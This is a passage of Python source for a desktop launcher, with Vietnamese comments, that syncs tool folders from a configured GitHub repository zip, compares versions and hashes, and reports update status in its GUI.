        first_level = [
            p for p in extracted.iterdir()
            if p.is_dir()
        ]
        for folder in first_level:
            if (folder / "tools").is_dir():
                return folder

        # Chống trường hợp người dùng upload cả một thư mục dự án vào repo,
        # ví dụ: repo/duc_github_dynamic_repo/tools/...
        # Tìm đệ quy nhưng giới hạn độ sâu để tránh quét vô tận.
        candidates = []
        for tools_dir in extracted.rglob("tools"):
            if not tools_dir.is_dir():
                continue

            try:
                rel = tools_dir.relative_to(extracted)
            except Exception:
                continue

            # Chỉ nhận tools nằm không quá 4 cấp dưới thư mục giải nén.
            if len(rel.parts) > 4:
                continue

            # Phải có ít nhất một tool.json ở bên dưới thì mới coi là tools hợp lệ.
            has_tool_json = any(
                p.is_file()
                for p in tools_dir.glob("*/tool.json")
            )
            if has_tool_json:
                candidates.append(tools_dir.parent)

        if candidates:
            # Ưu tiên đường dẫn nông nhất.
            candidates.sort(
                key=lambda p: len(p.relative_to(extracted).parts)
            )
            return candidates[0]

        raise RuntimeError(
            "Không tìm thấy thư mục tools/ hợp lệ trên GitHub.\n\n"
            "Cấu trúc cần có:\n"
            "tools/seb/tool.json\n"
            "tools/fullscreen/tool.json\n"
            "tools/file_solver/tool.json"
        )

    def sync_from_repo(self):
        self._recover_interrupted_tool_updates()

        repo_value = self.settings.get("repo", "").strip()
        if not repo_value:
            raise RuntimeError(
                "Chưa cấu hình GitHub repository."
            )

        owner, repo = parse_repo(repo_value)
        branch = self.settings.get("branch", "main").strip() or "main"

        with tempfile.TemporaryDirectory(
            prefix="duc_launcher_"
        ) as temp:
            temp = Path(temp)
            zip_path = temp / "repo.zip"
            extract_dir = temp / "repo"
            extract_dir.mkdir()

            self.download_repo_zip(
                owner,
                repo,
                branch,
                zip_path
            )

            with zipfile.ZipFile(zip_path, "r") as z:
                z.extractall(extract_dir)

            root = self.find_repo_root(extract_dir)
            remote_tools_root = root / "tools"

            remote_ids = set()
            discovered = 0
            updated = 0
            skipped_busy = 0

            for remote_folder in remote_tools_root.iterdir():
                if not remote_folder.is_dir():
                    continue

                meta = read_tool_meta(remote_folder)
                if not meta:
                    continue

                tool_id = str(meta["id"]).strip()
                if not tool_id:
                    continue

                discovered += 1
                remote_ids.add(tool_id)

                remote_hash = directory_hash(remote_folder)
                local_folder = TOOLS_DIR / tool_id

                # Không cho GitHub bản cũ ghi đè tool mới được bundle trong EXE.
                local_meta = read_tool_meta(local_folder) if local_folder.exists() else None
                if local_meta:
                    remote_version = str(meta.get("version", "0"))
                    local_version = str(local_meta.get("version", "0"))
                    if _version_key(remote_version) < _version_key(local_version):
                        continue

                local_sync = safe_json_read(
                    local_folder / ".sync.json",
                    {}
                ) if local_folder.exists() else {}

                local_hash = ""
                if isinstance(local_sync, dict):
                    local_hash = str(
                        local_sync.get("hash", "")
                    )

                if not local_hash and local_folder.exists():
                    try:
                        local_hash = directory_hash(local_folder)
                    except Exception:
                        local_hash = ""

                if remote_hash != local_hash:
                    did_update = copy_tool(
                        remote_folder,
                        local_folder,
                        remote_hash
                    )

                    if did_update:
                        updated += 1
                    else:
                        # Tool đang chạy / thư mục đang bị Windows khóa.
                        # Không popup lỗi; đóng tool rồi cập nhật lại.
                        skipped_busy += 1

            # KHÔNG tự xóa tool local nếu nó tạm thời không xuất hiện
            # trên GitHub. Điều này tránh mất SEB khi repo push thiếu file
            # hoặc GitHub đang ở trạng thái chưa hoàn chỉnh.
            # Muốn xóa tool thì xóa thủ công trong C:\duc\tools.
            # Tool updates are fully dynamic. The frozen EXE itself is not overwritten
            # while running; publish a new EXE only when launcher functionality changes.
            return {
                "discovered": discovered,
                "updated": updated,
                "skipped_busy": skipped_busy,
                "launcher_updated": False
            }

    def check_updates_async(self):
        if self.update_running:
            return

        if not self.settings.get("repo"):
            self._github_connected = False
            self._refresh_footer()
            self.open_settings()
            return

        self.update_running = True
        self.update_btn.config(state="disabled")

        # Đang thử kết nối: tạm coi là chưa kết nối cho tới khi sync thành công.
        self._github_connected = False
        self._refresh_footer()

        def worker():
            try:
                result = self.sync_from_repo()
                self.after(
                    0,
                    lambda: self.update_finished(
                        result,
                        None
                    )
                )
            except urllib.error.HTTPError as e:
                detail = f"GitHub HTTP {e.code}"
                if e.code == 404:
                    detail += (
                        "\nKiểm tra repo, branch hoặc quyền truy cập."
                    )
                elif e.code == 401:
                    detail += "\nGitHub token không hợp lệ."
                self.after(
                    0,
                    lambda d=detail: self.update_finished(
                        None,
                        d
                    )
                )
            except Exception as e:
                self.after(
                    0,
                    lambda err=str(e): self.update_finished(
                        None,
                        err
                    )
                )

        threading.Thread(
            target=worker,
            daemon=True
        ).start()

    def update_finished(self, result, error):
        self.update_running = False
        self.update_btn.config(state="normal")

        if error:
            self._github_connected = False
            self._refresh_footer()
            if (
                ("HTTP 401" in str(error) or "HTTP 404" in str(error))
                and not self.github_token()
            ):
                messagebox.showwarning(
                    "Repo cần quyền truy cập",
                    (
                        f"Không đọc được {FIXED_REPO}.\n\n"
                        "Nếu repo là PRIVATE, mở “CÀI ĐẶT” và nhập "
                        "một Fine-grained token MỚI có quyền Contents: Read-only.\n\n"
                        "Nếu repo là PUBLIC thì kiểm tra lại repo/branch."
                    )
                )
                self.open_settings()
            else:
                messagebox.showerror(
                    "Cập nhật thất bại",
                    error
                )
            return

        # Đồng bộ GitHub thành công.
        self._github_connected = True
        self.refresh_tools()
        self._refresh_footer()

        updated = int(result.get("updated", 0))
        discovered = int(result.get("discovered", 0))
        skipped_busy = int(result.get("skipped_busy", 0))

        if skipped_busy and updated:
            self.set_status(
                f"Đã cập nhật {updated} • bỏ qua {skipped_busy} tool đang chạy",
                YELLOW
            )
        elif skipped_busy:
            self.set_status(
                f"Bỏ qua {skipped_busy} tool đang chạy • đóng tool rồi cập nhật lại",
                YELLOW
            )
        elif updated:
            self.set_status(
                f"Đã cập nhật {updated} thay đổi",
                GREEN
            )
        else:
            self.set_status(
                f"Đã mới nhất • {discovered} tools",
                GREEN
            )

        if result.get("launcher_updated"):
            messagebox.showinfo(
                "Launcher đã được cập nhật",
                "Đã tải launcher mới.\n"
                "Đóng app và mở lại START_APP.bat để dùng bản mới."
            )


if __name__ == "__main__":
    if len(sys.argv) >= 3 and sys.argv[1] == "--run-tool":
        raise SystemExit(run_downloaded_tool(sys.argv[2]))

    Launcher().mainloop()
